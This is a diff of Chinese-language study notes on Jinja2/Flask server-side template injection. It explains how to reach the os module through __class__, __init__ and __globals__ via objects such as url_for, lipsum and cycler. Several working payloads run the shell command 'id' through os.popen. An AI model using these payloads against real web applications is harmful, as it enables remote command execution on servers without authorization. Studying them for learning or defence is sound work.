@@ -15,15 +15,11 @@ print(cat().__class__.__init__.__globals__['os'].popen('id').read())
 
 ##### **cat为自定义的类,导入了os模板影响了cat,此时他就可以使用os**
 
-
-
 模板注入过程
 
 ```
 实例对象-->类对象-->函数对象-->全局函数字典
 ```
-
-
 
 #### `__class__`:获取元素的类型
 
@@ -32,8 +28,6 @@ print(cat().__class__.__init__.__globals__['os'].popen('id').read())
 ```
 变量/对象.__class__
 ```
-
-
 
 ## 1.拥有对象方法的元素未被禁用
 
@@ -50,10 +44,16 @@ print(cat().__class__.__init__.__globals__['os'].popen('id').read())
 ```
 存在的对象.__class__.__init__
 ```
-#### **或者直接使用`url_for`,`get_flashed_messages`,lipsum,cycler,joiner,namespace这些象征函数对象的,使用是不用在经过__class__.__init__调出函数对象，但如果使用url_for()，它返回的是普通变量，这时候就不会存在全局字典了**
+#### **或者直接使用`url_for`,`get_flashed_messages`,lipsum这些象征函数对象的,使用是不用在经过__class__.__init__调出函数对象，但如果使用url_for()，它返回的是结果变量，这时候就不会存在全局字典了**
 
 ```
 url_for.__globals__['os'].popen('id').read()
+```
+
+### cycler,joiner,namespace是类对象,直接调用函数对象及后面的内容就行
+
+```
+cycler.__init__.__globals__['os'].popen('id').read()
 ```
 
 #### `__globals__`:对象方法模块出生的全局字典,包含os等主要模块
@@ -63,7 +63,7 @@ url_for.__globals__['os'].popen('id').read()
 ```
 #### 掏出全局字典的os
 ```
-存在的对象url_for().__class__.__init__.__globals__['os']
+存在的对象.__class__.__init__.__globals__['os']
 ```
 
 
